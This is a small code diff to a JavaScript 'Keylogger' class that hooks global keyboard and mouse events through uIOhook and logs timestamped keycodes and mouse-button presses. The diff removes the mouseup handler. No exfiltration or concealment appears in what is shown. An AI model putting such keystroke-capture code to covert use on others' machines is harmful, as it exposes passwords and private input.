@@ -41,13 +41,10 @@ class Keylogger {
       const timestamp = this.getFormattedTime();
       this.logEntries.push(`${timestamp}: Keycode ${e.keycode}`);
     });
+
     uIOhook.on('mousedown', (e) => {
       const timestamp = this.getFormattedTime();
       this.logEntries.push(`${timestamp}: Mouse button ${e.button} down`);
-    });
-    uIOhook.on('mouseup', (e) => {
-      const timestamp = this.getFormattedTime();
-      this.logEntries.push(`${timestamp}: Mouse button ${e.button} up`);
     });
   
     const throttledMouseMove = throttle((e) => {
